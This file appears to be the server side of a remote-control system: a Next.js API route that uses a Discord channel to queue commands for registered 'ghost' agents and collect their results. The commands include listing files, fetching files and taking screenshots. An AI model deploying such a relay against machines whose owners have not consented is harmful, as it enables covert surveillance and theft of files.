import { NextRequest, NextResponse } from "next/server";
import { discord } from "@/lib/discord-api-handler";
import { sendMessage, sanitizeMessage } from "@/lib/utils";
import { GHOST_CHANNEL_ID } from "@/lib/constants";
import { GHOST_VERSION, BUILD_DATE } from "@/lib/version";

export const dynamic = "force-dynamic";

// ID Channel khusus untuk Registry Devices (Penting: Pisahkan dari command channel agar bersih)
// Anda bisa membuat channel baru di Discord dan masukkan ID-nya di sini
// Untuk sekarang kita pakai GHOST_CHANNEL_ID, tapi idealnya dipisah.
// const REGISTRY_MESSAGE_ID_FILE = "device_registry.json"; // Virtual "file" name in Discord storage concept

// --- TYPES ---
interface DeviceStatus {
  id: string;
  name: string;
  ram_usage: number;
  ram_total: number;
  cpu_usage: number;
  cpu_brand: string;
  platform: string;
  os_type: string;
  user: string;
  version: string;
  last_seen: number;
}

interface CommandResult {
  type: "RESULT";
  target_id: string;
  status: string;
  data: any;
  timestamp: number;
}

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  const deviceId = searchParams.get("deviceId");
  const action = searchParams.get("action");

  if (!GHOST_CHANNEL_ID) {
    console.error(
      "❌ [CONFIG ERROR] GHOST_CHANNEL_ID is not set in environment variables!",
    );
    return NextResponse.json(
      { error: "Server Configuration Error" },
      { status: 500 },
    );
  }

  // CASE A: Frontend minta daftar device
  if (action === "list_devices") {
    const devices = await getDeviceRegistry();
    return NextResponse.json(devices);
  }

  // CASE B: Frontend poll untuk hasil command (RESULT)
  if (action === "get_result" && deviceId) {
    // 1. Cek Memory Cache dulu (Fast & Bypass Discord Limit)
    const resultCache = getResultRegistry();
    if (resultCache[deviceId]) {
      const result = resultCache[deviceId];
      // Hapus setelah dibaca agar tidak double trigger (atau biarkan jika ingin persist sedikit lama)
      // delete resultCache[deviceId];
      return NextResponse.json(result);
    }

    // 2. Fallback ke Discord (Cached)
    try {
      const messages = await fetchMessagesCached();
      if (!messages) return NextResponse.json(null);

      // Cari pesan RESULT terbaru untuk device ini
      for (const msg of messages) {
        const sanitized = sanitizeMessage(msg);
        let content: any = sanitized.content;

        if (typeof content === "string") {
          try {
            content = JSON.parse(content);
          } catch {
            continue;
          }
        }

        if (
          content &&
          content.type === "RESULT" &&
          content.target_id === deviceId
        ) {
          return NextResponse.json(content);
        }
      }
      return NextResponse.json(null);
    } catch (error) {
      return NextResponse.json(null);
    }
  }

  // CASE C: Agent Polling Command (PENDING)
  if (deviceId && !action) {
    try {
      // Ambil pesan terakhir (Cached to avoid Rate Limit)
      const messages = await fetchMessagesCached();
      if (!messages) return NextResponse.json(null);

      // Cari command yang ditujukan untuk deviceID ini dan statusnya PENDING
      for (const msg of messages) {
        const sanitized = sanitizeMessage(msg);
        let content: any = sanitized.content;

        // Handle content if string
        if (typeof content === "string") {
          try {
            content = JSON.parse(content);
          } catch {
            continue;
          }
        }

        if (
          content &&
          content.target_id === deviceId &&
          content.status === "PENDING"
        ) {
          console.log(`✅ [COMMAND] Dispatching ${content.cmd} to ${deviceId}`);
          return NextResponse.json({
            messageId: msg.id,
            command: content.cmd,
            args: content.args,
          });
        }
      }
      return NextResponse.json(null);
    } catch (error) {
      return NextResponse.json(null);
    }
  }

  if (action === "get_version") {
    return NextResponse.json({
      version: GHOST_VERSION,
      build_date: BUILD_DATE,
      changelog: "Auto-synced from Cargo.toml",
    });
  }

  return NextResponse.json({ error: "Invalid request" }, { status: 400 });
}

// 2. POST: Handle Heartbeat & Command Response
export async function POST(req: NextRequest) {
  try {
    const body = await req.json();

    // CASE A: Agent Heartbeat (Update Registry)
    if (body.action === "heartbeat") {
      await updateDeviceRegistry(body);
      return NextResponse.json({ success: true });
    }

    // CASE B: Agent Responding to Command
    if (body.action === "response") {
      // Hapus pesan command (PENDING)
      if (body.reply_to_id) {
        await discord.delete(
          `/channels/${GHOST_CHANNEL_ID}/messages/${body.reply_to_id}`,
        );
      }

      // Post Result (Sebagai pesan baru bertipe RESULT)
      const payload: CommandResult = {
        type: "RESULT",
        target_id: body.device_id,
        status: body.status,
        data: body.data,
        timestamp: Date.now(),
      };

      // SIMPAN DI MEMORY CACHE (Penting: Biar nggak kena limit Discord 2000 char)
      const resultCache = getResultRegistry();
      resultCache[body.device_id] = payload;

      // Kirim hasil ke channel (Hanya jika data kecil, kalau besar Discord bakal reject tapi memory cache udah aman)
      try {
        const stringified = JSON.stringify(payload);
        if (stringified.length < 1900) {
          await sendMessage(GHOST_CHANNEL_ID, {
            content: `\`\`\`json\n${stringified}\n\`\`\``,
          });
        } else {
          // Kirim notifikasi saja kalau data besar tersimpan di memory
          await sendMessage(GHOST_CHANNEL_ID, {
            content: `[SYSTEM] Result for ${body.device_id} is ready in Memory Cache (Large Data).`,
          });
        }
      } catch (e) {
        console.log(
          "Discord limit reached, result only available in memory cache.",
        );
      }

      return NextResponse.json({ success: true });
    }

    // CASE C: Frontend Mengirim Command Baru
    if (body.action === "queue_command") {
      console.log(
        `📣 [UI] Queuing command '${body.command}' for device ${body.deviceId}`,
      );
      const payload = {
        status: "PENDING",
        target_id: body.deviceId,
        cmd: body.command, // "LS", "GET_FILE", "SCREENSHOT"
        args: body.args || null,
        timestamp: Date.now(),
      };

      await sendMessage(GHOST_CHANNEL_ID, {
        content: `\`\`\`json\n${JSON.stringify(payload)}\n\`\`\``,
      });

      return NextResponse.json({ success: true });
    }

    // CASE D: Delete Device (CRUD)
    if (body.action === "delete_device") {
      await deleteDevice(body.deviceId);
      return NextResponse.json({ success: true });
    }

    // CASE E: Update Device (CRUD - Rename)
    if (body.action === "update_device") {
      await renameDevice(body.deviceId, body.newName);
      return NextResponse.json({ success: true });
    }

    return NextResponse.json({ error: "Invalid action" }, { status: 400 });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}

// --- HELPER: Device Registry (Local Memory / Global Hack) ---
// Note: Menggunakan global agar tidak ter-reset saat hot reload di Next.js development.
// Di Vercel production tetap akan reset saat cold boot.
declare global {
  var _ghostRegistry: Record<string, DeviceStatus> | undefined;
  var _ghostResults: Record<string, CommandResult> | undefined;
  var _ghostCustomNames: Record<string, string> | undefined;
  var _ghostCommandCache: { messages: any[]; timestamp: number } | undefined;
}

function getRegistry(): Record<string, DeviceStatus> {
  if (!global._ghostRegistry) global._ghostRegistry = {};
  return global._ghostRegistry;
}

function getResultRegistry(): Record<string, CommandResult> {
  if (!global._ghostResults) global._ghostResults = {};
  return global._ghostResults;
}

async function fetchMessagesCached(): Promise<any[] | null> {
  const now = Date.now();
  const CACHE_TTL = 3000; // 3 detik cache (Cukup aman buat bypass rate limit Discord)

  if (
    global._ghostCommandCache &&
    now - global._ghostCommandCache.timestamp < CACHE_TTL
  ) {
    // console.log("⚡ [GHOSBRIDGE] Returning cached messages");
    return global._ghostCommandCache.messages;
  }

  try {
    const messages = await discord.get<any[]>(
      `/channels/${GHOST_CHANNEL_ID}/messages?limit=10`,
    );

    if (messages) {
      global._ghostCommandCache = {
        messages,
        timestamp: now,
      };
    }
    return messages;
  } catch (error) {
    console.error("❌ [DISCORD ERROR] Failed to fetch messages:", error);
    return null;
  }
}

function getCustomNames(): Record<string, string> {
  if (!global._ghostCustomNames) global._ghostCustomNames = {};
  return global._ghostCustomNames;
}

async function getDeviceRegistry() {
  const cache = getRegistry();
  const customNames = getCustomNames();
  const now = Date.now();

  const activeDevices = Object.values(cache).map((d) => ({
    ...d,
    name: customNames[d.id] || d.name, // Gunakan custom name jika ada
    is_online: now - d.last_seen < 15000,
  }));
  return activeDevices;
}

async function updateDeviceRegistry(data: any) {
  const cache = getRegistry();
  const customNames = getCustomNames();

  cache[data.device_id] = {
    id: data.device_id,
    name: customNames[data.device_id] || data.device_name, // Prioritaskan custom name
    ram_usage: data.ram_usage,
    ram_total: data.ram_total,
    cpu_usage: data.cpu_usage || 0,
    cpu_brand: data.cpu_brand || "Unknown",
    platform: data.platform,
    os_type: data.os_type || "Unknown",
    user: data.user,
    version: data.version || "Unknown",
    last_seen: Date.now(),
  };
}

async function deleteDevice(deviceId: string) {
  const cache = getRegistry();
  const customNames = getCustomNames();
  delete cache[deviceId];
  delete customNames[deviceId];
}

async function renameDevice(deviceId: string, newName: string) {
  const cache = getRegistry();
  const customNames = getCustomNames();

  customNames[deviceId] = newName; // Simpan permanen di memory custom names
  if (cache[deviceId]) {
    cache[deviceId].name = newName;
  }
}
